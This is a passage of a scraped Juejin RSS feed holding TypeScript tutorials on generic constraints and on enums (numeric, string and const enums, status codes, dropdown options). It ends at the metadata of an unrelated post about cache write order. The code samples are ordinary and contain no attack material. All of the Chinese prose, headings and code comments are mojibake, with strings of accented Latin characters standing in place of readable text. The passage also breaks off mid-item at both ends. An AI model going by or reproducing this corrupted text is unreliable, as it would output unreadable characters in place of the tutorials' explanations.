<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getLength</span>(<span class="hljs-number">123</span>)); <span class="hljs-comment">// Error: Argument of type 'number' is not assignable to parameter of type 'HasLength'</span>
</code></pre>
<h4 data-id="heading-17">æ³›å‹çº¦æŸä¸é»˜è®¤å€¼ç»“åˆ</h4>
<p>æ³›å‹çº¦æŸå’Œé»˜è®¤å€¼å¯ä»¥åŒæ—¶ä½¿ç”¨ï¼Œè¯­æ³•é¡ºåºä¸ºã€Œ<code>&lt;T extends çº¦æŸç±»å‹ = é»˜è®¤ç±»å‹&gt;</code>ã€ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">HasId</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// çº¦æŸ T å¿…é¡»å®ç° HasId æ¥å£ï¼ŒåŒæ—¶è®¾ç½®é»˜è®¤å€¼</span>
<span class="hljs-keyword">function</span> getId&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HasId</span> = { <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> }&gt;(<span class="hljs-attr">obj</span>: T): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> obj.<span class="hljs-property">id</span>;
}

<span class="hljs-comment">// æœªæŒ‡å®šç±»å‹ï¼Œä½¿ç”¨é»˜è®¤å€¼ï¼ˆæ»¡è¶³ HasId çº¦æŸï¼‰</span>
<span class="hljs-keyword">const</span> defaultId = <span class="hljs-title function_">getId</span>({ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span> }); <span class="hljs-comment">// 1</span>

<span class="hljs-comment">// æŒ‡å®šå…·ä½“ç±»å‹ï¼ˆæ»¡è¶³ HasId çº¦æŸï¼‰</span>
<span class="hljs-keyword">const</span> customId = <span class="hljs-title function_">getId</span>({ <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">28</span> }); <span class="hljs-comment">// 2</span>
</code></pre>
<h4 data-id="heading-18">å¸¸ç”¨çº¦æŸï¼šçº¦æŸä¸ºå¯¹è±¡ã€å­—ç¬¦ä¸²/æ•°å­—å­—é¢é‡</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// çº¦æŸ T ä¸ºå¯¹è±¡ç±»å‹</span>
<span class="hljs-keyword">function</span> getProperty&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span>, K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">obj</span>: T, <span class="hljs-attr">key</span>: K): T[K] {
  <span class="hljs-keyword">return</span> obj[key];
}

<span class="hljs-keyword">const</span> user = { <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">28</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getProperty</span>(user, <span class="hljs-string">"name"</span>)); <span class="hljs-comment">// "å¼ ä¸‰"ï¼ˆç±»å‹ä¸º stringï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getProperty</span>(user, <span class="hljs-string">"age"</span>)); <span class="hljs-comment">// 28ï¼ˆç±»å‹ä¸º numberï¼‰</span>

<span class="hljs-comment">// çº¦æŸ K ä¸º "success" | "error" å­—é¢é‡ç±»å‹</span>
<span class="hljs-keyword">function</span> createMessage&lt;K <span class="hljs-keyword">extends</span> <span class="hljs-string">"success"</span> | <span class="hljs-string">"error"</span> = <span class="hljs-string">"success"</span>&gt;(<span class="hljs-attr">type</span>: K): { <span class="hljs-attr">type</span>: K; <span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span> } {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-keyword">type</span>,
    <span class="hljs-attr">content</span>: <span class="hljs-keyword">type</span> === <span class="hljs-string">"success"</span> ? <span class="hljs-string">"æ“ä½œæˆåŠŸ"</span> : <span class="hljs-string">"æ“ä½œå¤±è´¥"</span>
  };
}

<span class="hljs-keyword">const</span> successMsg = <span class="hljs-title function_">createMessage</span>(); <span class="hljs-comment">// { type: "success"; content: string }</span>
<span class="hljs-keyword">const</span> errorMsg = <span class="hljs-title function_">createMessage</span>(<span class="hljs-string">"error"</span>); <span class="hljs-comment">// { type: "error"; content: string }</span>
</code></pre>
<h3 data-id="heading-19">å››ã€æ³›å‹ä½¿ç”¨æ€»ç»“ä¸æœ€ä½³å®è·µ</h3>
<ol>
<li><strong>æ³›å‹çš„æ ¸å¿ƒä»·å€¼</strong>ï¼šå¤ç”¨ä»£ç ã€ä¿ç•™ç±»å‹ä¿¡æ¯ã€é¿å… <code>any</code> ç±»å‹ï¼Œå®ç°ã€Œçµæ´»ä¸å®‰å…¨å¹¶å­˜ã€ã€‚</li>
<li><strong>å››å¤§åº”ç”¨åœºæ™¯ä¼˜å…ˆçº§</strong>ï¼šæ³›å‹å‡½æ•° &gt; æ³›å‹æ¥å£ &gt; æ³›å‹ç±»å‹åˆ«å &gt; æ³›å‹ç±»ï¼ˆç±»çš„æ³›å‹ä½¿ç”¨åœºæ™¯ç›¸å¯¹æœ‰é™ï¼‰ã€‚</li>
<li><strong>æœ€ä½³å®è·µ</strong>ï¼š
<ul>
<li>ç±»å‹å‚æ•°å‘½åå°½é‡è¯­ä¹‰åŒ–ï¼ˆå¦‚ <code>T</code> è¡¨ç¤ºé€šç”¨ç±»å‹ï¼Œ<code>U</code>/<code>V</code> è¡¨ç¤ºè¾…åŠ©ç±»å‹ï¼Œ<code>K</code> è¡¨ç¤ºé”®ç±»å‹ï¼Œ<code>V</code> è¡¨ç¤ºå€¼ç±»å‹ï¼‰ã€‚</li>
<li>å¯¹äºæœ‰å¸¸ç”¨ç±»å‹çš„åœºæ™¯ï¼Œè®¾ç½®æ³›å‹é»˜è®¤å€¼ï¼Œæå‡ä»£ç æ˜“ç”¨æ€§ã€‚</li>
<li>å½“éœ€è¦é™åˆ¶æ³›å‹èŒƒå›´æ—¶ï¼Œä½¿ç”¨ <code>extends</code> è¿›è¡Œçº¦æŸï¼Œé¿å…éæ³•ç±»å‹ä¼ å…¥ã€‚</li>
<li>é¿å…è¿‡åº¦æ³›å‹åŒ–ï¼šå¦‚æœä¸€ä¸ªå‡½æ•°åªéœ€è¦æ”¯æŒä¸€ç§æˆ–ä¸¤ç§å›ºå®šç±»å‹ï¼Œæ— éœ€ä½¿ç”¨æ³›å‹ï¼Œç›´æ¥å®šä¹‰å…·ä½“ç±»å‹å³å¯ã€‚</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript Enum ç±»å‹å…¥é—¨ï¼šä»åŸºç¡€åˆ°å®æˆ˜]]></title>    <link>https://juejin.cn/post/7596890557545955374</link>    <guid>https://juejin.cn/post/7596890557545955374</guid>    <pubDate>2026-01-19T14:47:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596890557545955374" data-draft-id="7596904122865614899" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript Enum ç±»å‹å…¥é—¨ï¼šä»åŸºç¡€åˆ°å®æˆ˜"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-01-19T14:47:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¦‚æœä½ å¥½"/> <meta itemprop="url" content="https://juejin.cn/user/2272012281328215"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript Enum ç±»å‹å…¥é—¨ï¼šä»åŸºç¡€åˆ°å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2272012281328215/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¦‚æœä½ å¥½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T14:47:06.000Z" title="Mon Jan 19 2026 14:47:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯ Enumï¼Ÿ</h2>
<p>Enum æ˜¯ TypeScript æä¾›çš„<strong>è‡ªå®šä¹‰ç±»å‹</strong>ï¼Œç”¨æ¥å®šä¹‰<strong>ä¸€ç»„æœ‰åå­—çš„å¸¸é‡é›†åˆ</strong>ã€‚</p>
<p>ç®€å•è¯´ï¼Œå°±æ˜¯ç»™ä¸€å †å›ºå®šçš„å€¼èµ·ä¸ªå¥½è®°çš„åå­—ï¼Œæ›¿ä»£ä»£ç é‡Œçš„ã€Œé­”æ³•å€¼ã€ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸ç”¨æšä¸¾ï¼šç›´æ¥å†™å€¼ï¼Œåˆ«äººçœ‹ä¸æ‡‚ 200 å•¥æ„æ€</span>
<span class="hljs-keyword">const</span> successCode = <span class="hljs-number">200</span>;

<span class="hljs-comment">// ç”¨æšä¸¾ï¼šè¯­ä¹‰æ¸…æ™°ï¼Œä¸€çœ‹å°±æ‡‚</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">HttpStatus</span> {
  <span class="hljs-title class_">Success</span> = <span class="hljs-number">200</span>,
  <span class="hljs-title class_">Error</span> = <span class="hljs-number">500</span>
}
</code></pre>
<p>æšä¸¾çš„æ ¸å¿ƒå¥½å¤„ï¼š</p>
<ol>
<li><strong>å¯è¯»æ€§é«˜</strong>ï¼šä¸ç”¨çŒœæ•°å­—/å­—ç¬¦ä¸²ä»£è¡¨çš„å«ä¹‰</li>
<li><strong>ç±»å‹å®‰å…¨</strong>ï¼šå†™é”™å€¼ä¼šç›´æ¥æŠ¥é”™</li>
<li><strong>æ˜“ç»´æŠ¤</strong>ï¼šå¸¸é‡é›†ä¸­ç®¡ç†ï¼Œæ”¹ä¸€å¤„å°±è¡Œ</li>
</ol>
<h2 data-id="heading-1">äºŒã€Enum çš„ä¸¤ç§å¸¸ç”¨ç±»å‹</h2>
<p>TypeScript é‡Œæœ€å¸¸ç”¨çš„æ˜¯ <strong>æ•°å­—æšä¸¾</strong> å’Œ <strong>å­—ç¬¦ä¸²æšä¸¾</strong>ï¼Œå¼‚æ„æšä¸¾ï¼ˆæ•°å­—+å­—ç¬¦ä¸²æ··åˆï¼‰åŸºæœ¬ä¸ç”¨ï¼Œè¿™é‡Œä¸å±•å¼€ã€‚</p>
<h3 data-id="heading-2">1. æ•°å­—æšä¸¾</h3>
<p>æšä¸¾æˆå‘˜çš„å€¼æ˜¯æ•°å­—ï¼Œæ”¯æŒ<strong>è‡ªåŠ¨é€’å¢</strong>å’Œ<strong>åå‘æ˜ å°„</strong>ã€‚</p>
<h4 data-id="heading-3">åŸºç¡€ç”¨æ³•</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ˜¾å¼èµ‹å€¼ï¼šæ¯ä¸ªæˆå‘˜æŒ‡å®šæ•°å­—</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Weekday</span> {
  <span class="hljs-title class_">Monday</span> = <span class="hljs-number">1</span>,
  <span class="hljs-title class_">Tuesday</span> = <span class="hljs-number">2</span>,
  <span class="hljs-title class_">Wednesday</span> = <span class="hljs-number">3</span>
}

<span class="hljs-comment">// ä½¿ç”¨ï¼šç›´æ¥é€šè¿‡ æšä¸¾å.æˆå‘˜å å–å€¼</span>
<span class="hljs-keyword">const</span> today = <span class="hljs-title class_">Weekday</span>.<span class="hljs-property">Monday</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(today); <span class="hljs-comment">// è¾“å‡º 1</span>
</code></pre>
<h4 data-id="heading-4">è‡ªåŠ¨é€’å¢ï¼ˆè¶…æ–¹ä¾¿ï¼‰</h4>
<p>å¦‚æœä¸ç»™æˆå‘˜èµ‹å€¼ï¼ŒTypeScript ä¼šä» <code>0</code> å¼€å§‹è‡ªåŠ¨åŠ  1ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// éšå¼é€’å¢ï¼šLeft=0, Right=1, Top=2, Bottom=3</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Direction</span> {
  <span class="hljs-title class_">Left</span>,
  <span class="hljs-title class_">Right</span>,
  <span class="hljs-title class_">Top</span>,
  <span class="hljs-title class_">Bottom</span>
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Direction</span>.<span class="hljs-property">Right</span>); <span class="hljs-comment">// è¾“å‡º 1</span>
</code></pre>
<h4 data-id="heading-5">åå‘æ˜ å°„ï¼ˆæ•°å­—æšä¸¾ä¸“å±ï¼‰</h4>
<p>æ•°å­—æšä¸¾å¯ä»¥<strong>é€šè¿‡å€¼æŸ¥åå­—</strong>ï¼Œè¿™æ˜¯å­—ç¬¦ä¸²æšä¸¾æ²¡æœ‰çš„ç‰¹æ€§ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Weekday</span> {
  <span class="hljs-title class_">Monday</span> = <span class="hljs-number">1</span>
}

<span class="hljs-comment">// æ­£å‘ï¼šåå­— â†’ å€¼</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Weekday</span>.<span class="hljs-property">Monday</span>); <span class="hljs-comment">// 1</span>
<span class="hljs-comment">// åå‘ï¼šå€¼ â†’ åå­—</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Weekday</span>[<span class="hljs-number">1</span>]); <span class="hljs-comment">// "Monday"</span>
</code></pre>
<h3 data-id="heading-6">2. å­—ç¬¦ä¸²æšä¸¾</h3>
<p>æšä¸¾æˆå‘˜çš„å€¼æ˜¯å­—ç¬¦ä¸²ï¼Œ<strong>å¿…é¡»æ‰‹åŠ¨èµ‹å€¼</strong>ï¼Œä¸æ”¯æŒè‡ªåŠ¨é€’å¢å’Œåå‘æ˜ å°„ã€‚</p>
<h4 data-id="heading-7">åŸºç¡€ç”¨æ³•</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ¯ä¸ªæˆå‘˜éƒ½è¦å†™å­—ç¬¦ä¸²å€¼</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">UserRole</span> {
  <span class="hljs-title class_">Admin</span> = <span class="hljs-string">"ADMIN"</span>,
  <span class="hljs-title class_">Editor</span> = <span class="hljs-string">"EDITOR"</span>,
  <span class="hljs-title class_">Viewer</span> = <span class="hljs-string">"VIEWER"</span>
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> role = <span class="hljs-title class_">UserRole</span>.<span class="hljs-property">Admin</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(role); <span class="hljs-comment">// è¾“å‡º "ADMIN"</span>

<span class="hljs-comment">// å­—ç¬¦ä¸²æšä¸¾æ²¡æœ‰åå‘æ˜ å°„ï¼Œä¸‹é¢ä»£ç ä¼šæŠ¥é”™</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">UserRole</span>[<span class="hljs-string">"ADMIN"</span>]); <span class="hljs-comment">// undefined</span>
</code></pre>
<h4 data-id="heading-8">æ ¸å¿ƒä¼˜åŠ¿ï¼šå¯è¯»æ€§æ›´å¼º</h4>
<p>è°ƒè¯•æ—¶ç›´æ¥èƒ½çœ‹åˆ°å­—ç¬¦ä¸²å€¼ï¼Œæ¯”æ•°å­—æ›´ç›´è§‚ã€‚æ¯”å¦‚æ‰“å°æ—¥å¿—ï¼Œ<code>ADMIN</code> æ¯” <code>1</code> å¥½ç†è§£å¤šäº†ã€‚</p>
<h2 data-id="heading-9">ä¸‰ã€é«˜çº§å°æŠ€å·§ï¼šå¸¸é‡æšä¸¾ï¼ˆconst enumï¼‰</h2>
<p>åœ¨æšä¸¾å‰åŠ  <code>const</code>ï¼Œå°±æ˜¯<strong>å¸¸é‡æšä¸¾</strong>ã€‚å®ƒçš„ç‰¹ç‚¹æ˜¯ï¼šç¼–è¯‘åä¸ä¼šç”Ÿæˆé¢å¤–ä»£ç ï¼Œç›´æ¥æŠŠå€¼ã€ŒåµŒå…¥ã€åˆ°ä½¿ç”¨çš„åœ°æ–¹ï¼Œä½“ç§¯æ›´å°ã€é€Ÿåº¦æ›´å¿«ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å¸¸é‡æšä¸¾</span>
<span class="hljs-keyword">const</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span> {
  <span class="hljs-title class_">Red</span> = <span class="hljs-string">"RED"</span>,
  <span class="hljs-title class_">Green</span> = <span class="hljs-string">"GREEN"</span>
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> myColor = <span class="hljs-title class_">Color</span>.<span class="hljs-property">Green</span>;
</code></pre>
<h4 data-id="heading-10">ç¼–è¯‘åå¯¹æ¯”ï¼ˆçœ‹æ‡‚å°±è¡Œï¼‰</h4>
<ul>
<li>æ™®é€šæšä¸¾ï¼šä¼šç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œå å†…å­˜</li>
<li>å¸¸é‡æšä¸¾ï¼šç›´æ¥å˜æˆ <code>const myColor = "GREEN"</code>ï¼Œæ²¡æœ‰å¤šä½™ä»£ç </li>
</ul>
<blockquote>
<p>æ³¨æ„ï¼šå¸¸é‡æšä¸¾<strong>ä¸æ”¯æŒåå‘æ˜ å°„</strong>ï¼Œé€‚åˆåªéœ€è¦å–å€¼çš„åœºæ™¯ã€‚</p>
</blockquote>
<h2 data-id="heading-11">å››ã€å®æˆ˜åœºæ™¯ï¼šæšä¸¾åˆ°åº•æ€ä¹ˆç”¨ï¼Ÿ</h2>
<p>æšä¸¾åœ¨é¡¹ç›®é‡Œåˆ°å¤„èƒ½ç”¨ï¼Œä¸¾ä¸¤ä¸ªæœ€å¸¸è§çš„ä¾‹å­ã€‚</p>
<h3 data-id="heading-12">åœºæ™¯ 1ï¼šç®¡ç†æ¥å£çŠ¶æ€ç </h3>
<p>åç«¯è¿”å›çš„çŠ¶æ€ç ï¼Œç”¨æšä¸¾ç»Ÿä¸€ç®¡ç†ï¼Œå†ä¹Ÿä¸ç”¨è®°æ•°å­—äº†ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰çŠ¶æ€ç æšä¸¾</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">ApiStatus</span> {
  <span class="hljs-title class_">Success</span> = <span class="hljs-number">200</span>,
  <span class="hljs-title class_">NoAuth</span> = <span class="hljs-number">401</span>,
  <span class="hljs-title class_">ServerError</span> = <span class="hljs-number">500</span>
}

<span class="hljs-comment">// æ¥å£è¯·æ±‚ååˆ¤æ–­çŠ¶æ€</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResult</span>(<span class="hljs-params">code: ApiStatus</span>) {
  <span class="hljs-keyword">switch</span>(code) {
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ApiStatus</span>.<span class="hljs-property">Success</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"è¯·æ±‚æˆåŠŸ"</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ApiStatus</span>.<span class="hljs-property">NoAuth</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"è¯·å…ˆç™»å½•"</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ApiStatus</span>.<span class="hljs-property">ServerError</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æœåŠ¡å™¨å‡ºé”™äº†"</span>);
      <span class="hljs-keyword">break</span>;
  }
}

<span class="hljs-comment">// è°ƒç”¨å‡½æ•°</span>
<span class="hljs-title function_">handleResult</span>(<span class="hljs-title class_">ApiStatus</span>.<span class="hljs-property">NoAuth</span>); <span class="hljs-comment">// è¾“å‡º "è¯·å…ˆç™»å½•"</span>
</code></pre>
<h3 data-id="heading-13">åœºæ™¯ 2ï¼šåšä¸‹æ‹‰æ¡†é€‰é¡¹ï¼ˆå‰ç«¯å¸¸ç”¨ï¼‰</h3>
<p>Vue/React é‡Œçš„ä¸‹æ‹‰æ¡†é€‰é¡¹ï¼Œç”¨æšä¸¾å®šä¹‰ï¼Œé¿å…ç¡¬ç¼–ç ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ€§åˆ«æšä¸¾</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Gender</span> {
  <span class="hljs-title class_">Male</span> = <span class="hljs-string">"MALE"</span>,
  <span class="hljs-title class_">Female</span> = <span class="hljs-string">"FEMALE"</span>
}

<span class="hljs-comment">// è½¬æˆå‰ç«¯æ¡†æ¶éœ€è¦çš„é€‰é¡¹æ ¼å¼</span>
<span class="hljs-keyword">const</span> genderOptions = [
  { <span class="hljs-attr">label</span>: <span class="hljs-string">"ç”·"</span>, <span class="hljs-attr">value</span>: <span class="hljs-title class_">Gender</span>.<span class="hljs-property">Male</span> },
  { <span class="hljs-attr">label</span>: <span class="hljs-string">"å¥³"</span>, <span class="hljs-attr">value</span>: <span class="hljs-title class_">Gender</span>.<span class="hljs-property">Female</span> }
];

<span class="hljs-comment">// Vue é‡Œç”¨</span>
<span class="hljs-comment">// &lt;el-select v-model="gender"&gt;</span>
<span class="hljs-comment">//   &lt;el-option v-for="item in genderOptions" :key="item.value" :label="item.label" :value="item.value" /&gt;</span>
<span class="hljs-comment">// &lt;/el-select&gt;</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é«˜å¹¶å‘ä¸‹æ˜¯å…ˆå†™æ•°æ®åº“ï¼Œè¿˜æ˜¯å…ˆå†™ç¼“å­˜ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7596975035437809673</link>    <guid>https://juejin.cn/post/7596975035437809673</guid>    <pubDate>2026-01-20T01:57:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596975035437809673" data-draft-id="7596955804260319282" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é«˜å¹¶å‘ä¸‹æ˜¯å…ˆå†™æ•°æ®åº“ï¼Œè¿˜æ˜¯å…ˆå†™ç¼“å­˜ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T01:57:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" 